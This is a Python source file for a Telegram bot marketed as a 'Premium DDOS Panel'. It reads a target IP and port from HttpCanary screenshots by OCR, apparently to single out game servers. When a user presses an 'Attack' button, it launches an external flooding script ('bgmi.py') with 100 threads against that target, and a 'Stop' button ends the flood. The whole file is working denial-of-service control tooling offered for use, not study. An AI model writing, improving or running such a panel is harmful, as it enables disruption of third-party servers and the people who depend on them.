import os
import re
import sys
import signal
import subprocess
from io import BytesIO
from datetime import datetime
from PIL import Image
import pytesseract
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
from telegram.error import TimedOut
from config import TELEGRAM_BOT_TOKEN

selected_target = {}
attack_process = None

# Set tesseract path
pytesseract.pytesseract.tesseract_cmd = "/usr/bin/tesseract"

# Fixed Info
OWNER_USERNAME = '@Thuanmodessp'
CHANNEL_LINK = 'Thuandepzai'
EXPIRY_DATE = datetime(2030, 8, 2)

def check_expiry():
    if datetime.now() > EXPIRY_DATE:
        print(f"❌ This bot has expired. Join {OWNER_USERNAME} to get a new version.")
        sys.exit()

def welcome_banner():
    banner = f"""
────────────────────────────────────────
🔥 WELCOME TO Thuận VIP TOOL 🔥

💣 Premium DDOS Panel 💣
🔒 Secure Access Only
👑 Owner: {OWNER_USERNAME}

📢 Join our channel:
➡️ {CHANNEL_LINK}
────────────────────────────────────────
"""
    print(banner)

def extract_ip_port_from_image(image: Image.Image):
    text = pytesseract.image_to_string(image)
    matches = re.findall(r"(\d+\.\d+\.\d+\.\d+)[:\s](100\d+)", text)
    if matches:
        return matches[0][0], int(matches[0][1])
    return None, None

async def safe_reply(update, text, **kwargs):
    try:
        await update.message.reply_text(text, **kwargs)
    except TimedOut:
        print("⚠️ Telegram request timed out, bỏ qua tin nhắn này")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await safe_reply(
        update,
        "🤖 *DDoS Panel Bot by Thuận*\n\n"
        "📸 Please send a clear HttpCanary screenshot to automatically extract the IP and Port (Port must start with `100**`).\n\n"
        "⬇️ Once target is detected, use the buttons below to *start* or *stop* the attack.\n\n"
        "_Note: Buttons will always remain visible for easy control._",
        parse_mode="Markdown"
    )

async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    photo = update.message.photo[-1]
    file = await photo.get_file()
    image_bytes = await file.download_as_bytearray()
    image = Image.open(BytesIO(image_bytes))

    ip, port = extract_ip_port_from_image(image)

    if ip and port:
        selected_target[update.effective_chat.id] = (ip, port)

        keyboard = [[KeyboardButton("🚀 Attack"), KeyboardButton("⛔ Stop")]]
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

        await safe_reply(
            update,
            f"🎯 Target Detected:\n`{ip}:{port}`\n\nChoose action:",
            parse_mode="Markdown",
            reply_markup=reply_markup
        )
    else:
        await safe_reply(update, "❌ IP/Port not found. Send clear screenshot.")

async def handle_action(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global attack_process
    chat_id = update.effective_chat.id
    text = update.message.text.strip()

    if chat_id not in selected_target:
        await safe_reply(update, "❌ No target selected.")
        return

    ip, port = selected_target[chat_id]

    if text == "🚀 Attack":
        if attack_process:
            await safe_reply(update, "⚠️ Already running!")
            return

        # Cấu hình attack
        packet_size = 100
        threads = 100
        command = ["./bgmi.py", ip, str(port), "9999", str(packet_size), str(threads)]

        attack_process = subprocess.Popen(command)

        await safe_reply(
            update,
            f"🔥 Attack Started!\n🎯 `{ip}:{port}`\n\n⏹️ Use Stop button to end.",
            parse_mode="Markdown"
        )

    elif text == "⛔ Stop":
        if attack_process and attack_process.poll() is None:
            os.kill(attack_process.pid, signal.SIGINT)
            attack_process.wait()
            attack_process = None
            await safe_reply(update, "✅ Attack stopped.")
        else:
            await safe_reply(update, "ℹ️ No running attack.")

def main():
    check_expiry()
    welcome_banner()
    
    # Tăng timeout để giảm lỗi TimedOut
    app = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN)\
        .connect_timeout(60).read_timeout(60).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_action))
    
    print("🤖 Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
